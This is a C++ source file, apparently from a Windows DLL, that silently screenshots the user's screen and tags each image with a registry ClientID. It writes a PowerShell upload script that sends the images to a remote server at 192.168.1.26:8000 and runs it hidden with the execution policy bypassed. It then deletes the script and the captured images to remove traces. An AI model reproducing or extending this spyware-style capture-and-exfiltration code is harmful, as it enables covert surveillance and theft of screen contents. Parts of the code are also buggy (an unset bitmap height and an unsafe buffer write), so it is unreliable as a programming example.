#include "pch.h"
#include <windows.h>
#include <string>
#include <fstream>
#include <sstream>
#include <chrono>
#include <iostream>
#include <cstdio>
#include <jpeglib.h>
#include <setjmp.h>
#include <filesystem>

#include "utils.h"

struct my_error_mgr {
    struct jpeg_error_mgr pub;
    jmp_buf setjmp_buffer;
};

METHODDEF(void) my_error_exit(j_common_ptr cinfo) {
    my_error_mgr* myerr = (my_error_mgr*)cinfo->err;
    (*cinfo->err->output_message)(cinfo);
    longjmp(myerr->setjmp_buffer, 1);
}

void SaveJPEG(HBITMAP hBitmap, LPCSTR filename) {
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    std::string directoryPath = "C:\\Users\\Sergio\\Desktop\\capturas\\";
    std::string fullPath = directoryPath + filename;  


    if (!std::filesystem::exists(directoryPath)) {
        std::filesystem::create_directories(directoryPath);  
    }
    int width = bmp.bmWidth;
    int height = bmp.bmHeight;
    int row_stride = width * 3;

   
    unsigned char* bitmapData = new unsigned char[row_stride * height];
   
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0; 
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    GetDIBits(GetDC(NULL), hBitmap, 0, height, bitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    struct jpeg_compress_struct cinfo;
    struct my_error_mgr jerr;
    FILE* outfile;
    JSAMPROW row_pointer[1];

    cinfo.err = jpeg_std_error(&jerr.pub);
    jerr.pub.error_exit = my_error_exit;

    if (setjmp(jerr.setjmp_buffer)) {
        jpeg_destroy_compress(&cinfo);
        fclose(outfile);
        return;
    }

    jpeg_create_compress(&cinfo);

    errno_t err = fopen_s(&outfile, fullPath.c_str(), "wb");
    if (err != 0 || outfile == nullptr) {
        fprintf(stderr, "can't open %s\n", fullPath.c_str());
        exit(1);
    }

    jpeg_stdio_dest(&cinfo, outfile);

    cinfo.image_width = width;
    cinfo.image_height = height;
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;

    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, 75, TRUE);
    jpeg_start_compress(&cinfo, TRUE);

    while (cinfo.next_scanline < cinfo.image_height) {
        row_pointer[0] = &bitmapData[cinfo.next_scanline * row_stride];
        jpeg_write_scanlines(&cinfo, row_pointer, 1);
    }

    jpeg_finish_compress(&cinfo);
    fclose(outfile);
    jpeg_destroy_compress(&cinfo);
    delete[] bitmapData;
}



void CaptureAndSaveScreenshot() {
    MessageBoxA(NULL, "screencapture!!", "Alert", MB_ICONINFORMATION);
    //ultimoChequeoScreenshot = ahora; 
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    char clientId[256];
    DWORD clientIdSize = sizeof(clientId);

    if (GetRegistryValue(HKEY_CURRENT_USER, "Software\\MiAplicacion", "ClientID", REG_SZ, (BYTE*)clientId, &clientIdSize)) {
        clientId[clientIdSize] = '\0';
        std::string directoryPath = "C:\\Users\\Sergio\\Desktop\\capturas\\";


        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::tm tm = {};
        localtime_s(&tm, &time); 

       
        std::stringstream datetime;
        datetime << std::put_time(&tm, "%Y%m%d-%H%M%S"); 

        int fileCount = CountFilesInDirectory(directoryPath);
        std::string filename = std::string(clientId) + "-" + datetime.str() + ".jpg"; 

        SaveJPEG(hBitmap, filename.c_str()); 
    }
}

void SendPicturesToServer() {
    std::string filepath = "C:\\Users\\Sergio\\Desktop\\upload_script.ps1";


    std::ofstream scriptFile(filepath);


    if (!scriptFile.is_open()) {
        std::cerr << "Error opening file to write" << std::endl;
        return;
    }


    scriptFile << R"($uri = "http://192.168.1.26:8000/upload/"
                $directoryPath = "C:\Users\Sergio\Desktop\capturas"
                $LF = "`r`n"
                $enc = [System.Text.Encoding]::UTF8

                # Get all jpg files in the directory
                $files = Get-ChildItem -Path $directoryPath -Filter "*.jpg"

                foreach ($file in $files) {
                    $filePath = $file.FullName
                    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
                    $boundary = [System.Guid]::NewGuid().ToString()
                    $headers = @{
                        "Content-Type" = "multipart/form-data; boundary=$boundary"
                    }

                    $line1 = "--$boundary$LF" + "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$LF" + "Content-Type: application/octet-stream$LF$LF"
                    $line2 = "$LF--$boundary--$LF"

                    $body = New-Object byte[] ($enc.GetByteCount($line1) + $fileContent.Length + $enc.GetByteCount($line2))
                    $offset = 0
                    $enc.GetBytes($line1, 0, $line1.Length, $body, $offset)
                    $offset += $line1.Length
                    [System.Array]::Copy($fileContent, 0, $body, $offset, $fileContent.Length)
                    $offset += $fileContent.Length
                    $enc.GetBytes($line2, 0, $line2.Length, $body, $offset)

                    # Make the POST request
                    Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"
                }
                )" << std::endl;


    scriptFile.close();

    std::string powershellScriptPath = "C:\\Users\\Sergio\\Desktop\\upload_script.ps1"; 
    std::string cmd = "powershell.exe -ExecutionPolicy Bypass -File \"" + powershellScriptPath + "\"";

    std::string output;
    ExecuteCommandHidden(cmd.c_str(), output);

    //std::string powershellScriptPath = "C:\\Users\\Sergio\\Desktop\\upload_script.ps1";
    std::string deleteCmd = "powershell.exe -Command \"Remove-Item -Path '" + powershellScriptPath + "' -Force\"";

    std::string output2;
    ExecuteCommandHidden(deleteCmd.c_str(), output2);


    std::string directoryPath = "C:\\Users\\Sergio\\Desktop\\capturas"; 
    std::string deleteFiles = "powershell.exe -Command \"Remove-Item -Path '" + directoryPath + "\\*' -Force\"";

    std::string output3;
    ExecuteCommandHidden(deleteFiles.c_str(), output3);
}

